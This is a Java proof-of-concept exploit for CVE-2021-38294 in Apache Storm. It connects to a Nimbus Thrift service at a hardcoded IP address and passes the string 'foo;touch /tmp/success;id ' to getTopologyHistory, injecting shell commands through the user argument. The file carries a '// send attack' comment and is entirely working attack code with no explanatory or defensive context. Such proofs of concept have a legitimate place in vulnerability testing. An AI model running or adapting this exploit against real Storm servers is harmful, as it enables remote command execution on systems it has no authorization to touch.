package storm.cve;

import org.apache.storm.utils.NimbusClient;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class CVE_2021_38294 {

    public static void main(String[] args) {
        try {
            HashMap config = new HashMap();
            List<String> seeds = new ArrayList<String>();
            seeds.add("localhost");
            config.put("storm.thrift.transport", "org.apache.storm.security.auth.SimpleTransportPlugin");
            config.put("storm.thrift.socket.timeout.ms", 60000);
            config.put("nimbus.seeds", seeds);
            config.put("storm.nimbus.retry.times", 5);
            config.put("storm.nimbus.retry.interval.millis", 2000);
            config.put("storm.nimbus.retry.intervalceiling.millis", 60000);
            config.put("nimbus.thrift.port", 6627);
            config.put("nimbus.thrift.max_buffer_size", 1048576);
            config.put("nimbus.thrift.threads", 64);
            NimbusClient nimbusClient = new NimbusClient(config, "10.58.120.200", 6627);
            // send attack
            nimbusClient.getClient().getTopologyHistory("foo;touch /tmp/success;id ");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}